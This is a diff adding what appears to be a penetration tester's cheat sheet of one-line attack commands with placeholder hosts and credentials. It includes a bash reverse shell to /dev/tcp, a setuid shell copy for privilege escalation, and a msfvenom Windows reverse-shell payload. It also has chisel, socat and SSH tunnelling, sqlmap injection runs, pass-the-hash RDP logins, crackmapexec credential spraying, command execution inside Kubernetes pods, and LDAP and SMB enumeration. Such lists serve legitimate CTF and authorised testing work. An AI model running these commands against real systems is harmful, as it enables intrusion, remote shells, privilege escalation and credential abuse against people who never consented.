@@ -1,0 +1,44 @@
+alias ls='ls -at --full-time'
+bash -i >& /dev/tcp/IP/PORT 0>&1
+chisel client IP:PORT R:PORT:socks
+chisel client IP:PORT R:socks
+chisel server -p PORT --reverse
+cp /bin/sh /tmp/sh && chmod +s /tmp/sh
+curl --path-as-is URL
+curl -u USERNAME:PASSWORD pop3://IP
+curl -X POST -F "ARG=@PATH;filename=FILE;type=TYPE" URL
+dig axfr @IP DOMAIN
+find . -type f -printf '%T+ %p\n' 2> /dev/null | grep -v 0000000000 | sort
+ip link add dummy0 type dummy && ip link delete dummy0
+ldapsearch -x -H ldap://IP -b 'dc=DC0,dc=DC1'
+ldapsearch -x -H ldap://IP -D USERNAME@DOMAIN -w PASSWORD -b 'dc=DC0,dc=DC1'
+ldapsearch -x -H ldap://IP -s base
+snmpwalk -v 2c -c public IP .1 ET-SNMP-EXTEND-MIB::nsExtendOutputFull
+nmap -6 IPv6
+nmap -Pn -p3389,5985-5986 IP
+nmap -sSU -p- -Pn --max-retries=0 -T4 -v IP
+proxychains nmap -sT -Pn -p 21,80,443 IP
+openssl pkcs12 -in PFX_PATH -out CRT_PATH -nokeys -nodes
+openssl pkcs12 -in PFX_PATH -out PEM_PATH -nocerts -nodes
+php -S localhost:PORT
+rpcclient -U USERNAME IP
+smbclient -U geust '\\IP\SHARE'
+smbclient -U USERNAME -L IP
+sqlmap -r PATH --force-ssl
+sqlmap -r PATH --privileges
+sqlmap -r PATH --technique=BEUS --level=5 --risk=3 -v 3 --batch
+wpscan --plugins-detection aggressive -e ap --url URL
+kubectl auth can-i --list --server=URL --token TOKEN --certificate-authority=ca.crt
+kubectl describe pod PODD --list --server=URL --token TOKEN --certificate-authority=ca.crt
+kubeletctl -s IP exec "/bin/sh" --namespace NAMESPACE --pod POD --container CONTAINER
+echo -n COMMAND | iconv --to-code UTF-16LE | base64 -w 0
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+x86_64-w64-mingw32-gcc SOURCE --shared -o DLL
+getcap -r / 2>/dev/null
+socat -ddd TCP-LISTEN:PORT,fork TCP:IP:PORT
+ssh -D PORT USERNAME@IP
+ssh -R PORT USERNAME@IP
+xfreerdp /cert-ignore /u:USERNAME /p:PASSWORD /v:IP /d:DOMAIN
+xfreerdp /cert-ignore /u:USERNAME /pth:NTLM /v:IP /d:DOMAIN
+crackmapexec smb IP -u USERNAME -p PASSWORD --continue-on-success
+wpscan --url URL --enumerate p --plugins-detection aggressive
